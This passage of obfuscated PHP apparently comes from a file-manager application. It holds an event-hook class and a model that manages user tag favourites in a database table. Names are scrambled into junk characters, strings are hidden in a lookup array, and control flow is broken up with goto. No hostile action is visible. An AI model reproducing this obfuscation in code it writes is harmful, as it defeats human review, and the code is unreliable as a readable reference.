$c­¶¡óÊ”Í[1659] => $c­¶¡óÊ”Í[1660], $c­¶¡óÊ”Í[1661] => $c­¶¡óÊ”Í[1662]))), $c­¶¡óÊ”Í[1663] => array($c­¶¡óÊ”Í[156] => $c­¶¡óÊ”Í[1664] . $c­¶¡óÊ”Í[1665], $c­¶¡óÊ”Í[1577] => array($c­¶¡óÊ”Í[1581] => $c­¶¡óÊ”Í[1666], $c­¶¡óÊ”Í[183] => $c­¶¡óÊ”Í[1667], $c­¶¡óÊ”Í[106] => $c­¶¡óÊ”Í[1668], $c­¶¡óÊ”Í[1613] => $c­¶¡óÊ”Í[1669], $c­¶¡óÊ”Í[1670] => $c­¶¡óÊ”Í[1671], $c­¶¡óÊ”Í[1672] => $c­¶¡óÊ”Í[1599], $c­¶¡óÊ”Í[1673] => $c­¶¡óÊ”Í[1674], $c­¶¡óÊ”Í[1675] => $c­¶¡óÊ”Í[1676], $c­¶¡óÊ”Í[1677] => $c­¶¡óÊ”Í[1678], $c­¶¡óÊ”Í[1590] => array($c­¶¡óÊ”Í[1304] => $c­¶¡óÊ”Í[1679], $c­¶¡óÊ”Í[1594] => $c­¶¡óÊ”Í[1680], $c­¶¡óÊ”Í[1595] => $c­¶¡óÊ”Í[1681], $c­¶¡óÊ”Í[1682] => $c­¶¡óÊ”Í[1683], $c­¶¡óÊ”Í[1684] => $c­¶¡óÊ”Í[1685], $c­¶¡óÊ”Í[1686] => $c­¶¡óÊ”Í[1687], $c­¶¡óÊ”Í[1573] => $c­¶¡óÊ”Í[1688]))), $c­¶¡óÊ”Í[1689] => array($c­¶¡óÊ”Í[156] => $c­¶¡óÊ”Í[1690] . $c­¶¡óÊ”Í[1691], $c­¶¡óÊ”Í[1577] => array($c­¶¡óÊ”Í[1494] => $c­¶¡óÊ”Í[1692], $c­¶¡óÊ”Í[1496] => $c­¶¡óÊ”Í[1693], $c­¶¡óÊ”Í[1581] => $c­¶¡óÊ”Í[1666], $c­¶¡óÊ”Í[183] => $c­¶¡óÊ”Í[1694], $c­¶¡óÊ”Í[106] => $c­¶¡óÊ”Í[1695], $c­¶¡óÊ”Í[1600] => $c­¶¡óÊ”Í[1696], $c­¶¡óÊ”Í[1677] => $c­¶¡óÊ”Í[1697], $c­¶¡óÊ”Í[1673] => $c­¶¡óÊ”Í[1698], $c­¶¡óÊ”Í[1613] => $c­¶¡óÊ”Í[1699], $c­¶¡óÊ”Í[1663] => array($c­¶¡óÊ”Í[1672] => $c­¶¡óÊ”Í[1599], $c­¶¡óÊ”Í[1700] => $c­¶¡óÊ”Í[1701], $c­¶¡óÊ”Í[1670] => $c­¶¡óÊ”Í[1671], $c­¶¡óÊ”Í[1677] => $c­¶¡óÊ”Í[1678], $c­¶¡óÊ”Í[1673] => $c­¶¡óÊ”Í[1702], $c­¶¡óÊ”Í[1675] => $c­¶¡óÊ”Í[1676]))), $c­¶¡óÊ”Í[1703] => array($c­¶¡óÊ”Í[1577] => array($c­¶¡óÊ”Í[1704] => $c­¶¡óÊ”Í[1705], $c­¶¡óÊ”Í[1706] => $c­¶¡óÊ”Í[1707])), $c­¶¡óÊ”Í[1708] => array($c­¶¡óÊ”Í[1577] => array())); } } class Hook { private static $events = array(); public static function get($FËŒñºê˜Û = false) { if (!$FËŒñºê˜Û) { return self::$events; } else { return self::$events[$FËŒñºê˜Û]; } } public static function apply($FÆ¾ø¡Ç, $f…˜´ì›ÃÀ = array()) { $fÅ©í¿×´ = ActionApply($FÆ¾ø¡Ç, $f…˜´ì›ÃÀ); if (is_string($FÆ¾ø¡Ç)) { Hook::trigger($FÆ¾ø¡Ç); } return $fÅ©í¿×´; } public static function bind($CîÛŒèÂé, $böäİøÊñŠ, $BíòËòÕ‹‹ = false) { $D’æÌ—À¹ =& $_SERVER[Ä¿Ş°¨]; if (!isset(self::$events[$CîÛŒèÂé])) { self::$events[$CîÛŒèÂé] = array(); } self::$events[$CîÛŒèÂé][] = array($D’æÌ—À¹[1709] => $böäİøÊñŠ, $D’æÌ—À¹[1710] => $BíòËòÕ‹‹, $D’æÌ—À¹[1711] => 0); } public static function once($D²ÜÍÄ³Û¦, $eëŠè‹ùĞù) { self::bind($D²ÜÍÄ³Û¦, $eëŠè‹ùĞù, !0); } public static function unbind($C•×Øò×õ, $aë¥æÄ¬¯î = false) { if (!$aë¥æÄ¬¯î) { self::$events[$C•×Øò×õ] = array(); return; } $eãŒâ‘ßĞ  = self::$events[$C•×Øò×õ]; self::$events[$C•×Øò×õ] = array(); if (!is_array($eãŒâ‘ßĞ )) { return; } for ($aÅŠÂÏÈØ = 0; $aÅŠÂÏÈØ < count($eãŒâ‘ßĞ ); $aÅŠÂÏÈØ++) { if ($eãŒâ‘ßĞ [$aÅŠÂÏÈØ][$_SERVER[Ä¿Ş°¨][1709]] == $aë¥æÄ¬¯î) { continue; } self::$events[$C•×Øò×õ][] = $eãŒâ‘ßĞ [$aÅŠÂÏÈØ]; } } public static function filter($bÎÛ Ã¼ğ, $eàë÷±Ğğš) { goto DíáØ¯âïá; eË¼ˆ¼œ¯: for ($A¸¯Æ››·Ù = 0; $A¸¯Æ››·Ù < count($bÄºÆ®”ÍÓ); $A¸¯Æ››·Ù++) { $A½›îÎ…†Ó = $bÄºÆ®”ÍÓ[$A¸¯Æ››·Ù]; if ($A½›îÎ…†Ó[$cŸğ´ØÌ²À[1710]] && $A½›îÎ…†Ó[$cŸğ´ØÌ²À[1711]] > 1) { continue; } self::$events[$bÎÛ Ã¼ğ][$A¸¯Æ››·Ù][$cŸğ´ØÌ²À[1711]] = $A½›îÎ…†Ó[$cŸğ´ØÌ²À[1711]] + 1; $c“ÉØîã† = self::apply($A½›îÎ…†Ó[$cŸğ´ØÌ²À[1709]], array($E´Í‚ÀÍÖ°)); if (gettype($c“ÉØîã†) == gettype($E´Í‚ÀÍÖ°)) { $E´Í‚ÀÍÖ° = $c“ÉØîã†; } } return $E´Í‚ÀÍÖ°; goto B¦ôÆÑÇ¹; DíáØ¯âïá: $cŸğ´ØÌ²À =& $_SERVER[Ä¿Ş°¨]; $CäĞ’”†ô = self::$events; if (!isset($CäĞ’”†ô[$bÎÛ Ã¼ğ])) { return $eàë÷±Ğğš; } goto BŸÏéĞøÑİ; BŸÏéĞøÑİ: $bÄºÆ®”ÍÓ = $CäĞ’”†ô[$bÎÛ Ã¼ğ]; $E´Í‚ÀÍÖ° = $eàë÷±Ğğš; if (!is_array($bÄºÆ®”ÍÓ) || count($bÄºÆ®”ÍÓ) == 0) { return $E´Í‚ÀÍÖ°; } goto eË¼ˆ¼œ¯; B¦ôÆÑÇ¹: } public static function trigger($c ÊÂ„ˆÍ) { goto fóÃÜùÌ½; fóÃÜùÌ½: $fÂª‹¾àĞ‰ =& $_SERVER[Ä¿Ş°¨]; $b¯ğºäÃİÆ = self::$events; $d¢Í±ŞÀóò = !1; goto CÁ»Í†öÖ; CÁ»Í†öÖ: if (!isset($b¯ğºäÃİÆ[$c ÊÂ„ˆÍ])) { return $d¢Í±ŞÀóò; } $c¬Ø‚§­ƒƒ = $b¯ğºäÃİÆ[$c ÊÂ„ˆÍ]; if (!is_array($c¬Ø‚§­ƒƒ) || count($c¬Ø‚§­ƒƒ) == 0) { return $d¢Í±ŞÀóò; } goto cˆš‘œì¦ğ; Aˆùã‘…¯Ç: return $d¢Í±ŞÀóò; goto bÙâ§©•Ñé; cˆš‘œì¦ğ: $Fë‚À°çà = func_get_args(); array_shift($Fë‚À°çà); for ($fëì¬šğË = 0; $fëì¬šğË < count($c¬Ø‚§­ƒƒ); $fëì¬šğË++) { $dóñƒÛÎ‰ = $c¬Ø‚§­ƒƒ[$fëì¬šğË]; if ($dóñƒÛÎ‰[$fÂª‹¾àĞ‰[1710]] && $dóñƒÛÎ‰[$fÂª‹¾àĞ‰[1711]] > 1) { continue; } if (defined($fÂª‹¾àĞ‰[1712]) && GLOBAL_LOG_HOOK) { write_log($c ÊÂ„ˆÍ . $fÂª‹¾àĞ‰[1713] . $dóñƒÛÎ‰[$fÂª‹¾àĞ‰[1709]], $fÂª‹¾àĞ‰[1714]); } self::$events[$c ÊÂ„ˆÍ][$fëì¬šğË][$fÂª‹¾àĞ‰[1711]] = $dóñƒÛÎ‰[$fÂª‹¾àĞ‰[1711]] + 1; $F«ÉšÕ´‰“ = self::apply($dóñƒÛÎ‰[$fÂª‹¾àĞ‰[1709]], $Fë‚À°çà); if (defined($fÂª‹¾àĞ‰[1712]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $fÂª‹¾àĞ‰[1714]); if ($dóñƒÛÎ‰[$fÂª‹¾àĞ‰[1711]] == 200) { $eÃ‘ÂµÎŒ = is_array($dóñƒÛÎ‰[$fÂª‹¾àĞ‰[1709]]) ? json_encode_force($dóñƒÛÎ‰[$fÂª‹¾àĞ‰[1709]]) : $dóñƒÛÎ‰[$fÂª‹¾àĞ‰[1709]]; write_log($fÂª‹¾àĞ‰[1715] . $c ÊÂ„ˆÍ . $fÂª‹¾àĞ‰[1716] . $eÃ‘ÂµÎŒ, $fÂª‹¾àĞ‰[1717]); } } $d¢Í±ŞÀóò = is_null($F«ÉšÕ´‰“) ? $d¢Í±ŞÀóò : $F«ÉšÕ´‰“; } goto Aˆùã‘…¯Ç; bÙâ§©•Ñé: } } goto c§É­Ô´ÄÆ; a‘Ø„éÔâ¥: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\x66\141\x76"; protected function cacheFunctionAlias($DÔîÓè†Ë) { $A´Á›ç³õÏ =& $_SERVER[Ä¿Ş°¨]; return array($A´Á›ç³õÏ[2437] => array(USER_ID, $A´Á›ç³õÏ[2493])); } protected function listData() { $bÚœ­ù‹Á› =& $_SERVER[Ä¿Ş°¨]; $CöËÆä†ÏÎ = array($bÚœ­ù‹Á›[1390] => USER_ID, $bÚœ­ù‹Á›[440] => array($bÚœ­ù‹Á›[2494], 0)); $eÂôô° Õ = $bÚœ­ù‹Á›[2495]; $Eå£óòáƒ = $bÚœ­ù‹Á›[2496]; $e—˜À»¬‡Ş = $this->field($eÂôô° Õ)->where($CöËÆä†ÏÎ)->order($Eå£óòáƒ)->select(); return $e—˜À»¬‡Ş ? $e—˜À»¬‡Ş : array(); } protected function listByTag($E‡”Ù ’ÁÉ) { } protected function addToTag($Dõ …±, $eö¢°¶Š±) { $a‘‡½Í§ÍÓ =& $_SERVER[Ä¿Ş°¨]; if (!Model($a‘‡½Í§ÍÓ[2263])->listData($eö¢°¶Š±) || !Model($a‘‡½Í§ÍÓ[746])->pathInfo($Dõ …±)) { return !1; } $añÃ›š¨ò = array($a‘‡½Í§ÍÓ[1390] => USER_ID, $a‘‡½Í§ÍÓ[440] => $eö¢°¶Š±, $a‘‡½Í§ÍÓ[392] => $Dõ …±, $a‘‡½Í§ÍÓ[393] => $a‘‡½Í§ÍÓ[387], $a‘‡½Í§ÍÓ[391] => $a‘‡½Í§ÍÓ[33], $a‘‡½Í§ÍÓ[2067] => 0); if ($this->where($añÃ›š¨ò)->find()) { return !1; } return $this->add($añÃ›š¨ò); } protected function removeFromTag($f¥“‰Îù‚•, $aˆ¹Ô‚©) { $fÇ¨§»ÃÔ =& $_SERVER[Ä¿Ş°¨]; if (!Model($fÇ¨§»ÃÔ[2263])->listData($aˆ¹Ô‚©) || !Model($fÇ¨§»ÃÔ[746])->pathInfo($f¥“‰Îù‚•)) { return !1; } $AÈ˜ÇŞŠËÕ = array($fÇ¨§»ÃÔ[1390] => USER_ID, $fÇ¨§»ÃÔ[440] => $aˆ¹Ô‚©, $fÇ¨§»ÃÔ[393] => $fÇ¨§»ÃÔ[387], $fÇ¨§»ÃÔ[392] => $f¥“‰Îù‚•); return $this->where($AÈ˜ÇŞŠËÕ)->delete(); } protected function removeByTag($F¥¨‘ˆÂßè) { $Eç†’¡‹ =& $_SERVER[Ä¿Ş°¨]; if (!$F¥¨‘ˆÂßè) { return !1; } $c×†­´öÈÎ = array($Eç†’¡‹[1390] => USER_ID, $Eç†’¡‹[440] => $F¥¨‘ˆÂßè); return $this->where($c×†­´öÈÎ)->delete(); } protected function removeBySource($e‘ì”ˆ²Ÿ¬) { $eºéÏ²ìœ« =& $_SERVER[Ä¿Ş°¨]; $D‡ï‹…¨—é = array($eºéÏ²ìœ«[1390] => USER_ID, $eºéÏ²ìœ«[392] => $e‘ì”ˆ²Ÿ¬, $eºéÏ²ìœ«[440] => array($eºéÏ²ìœ«[915], 0)); return $this->where($D‡ï‹…¨—é)->delete(); } }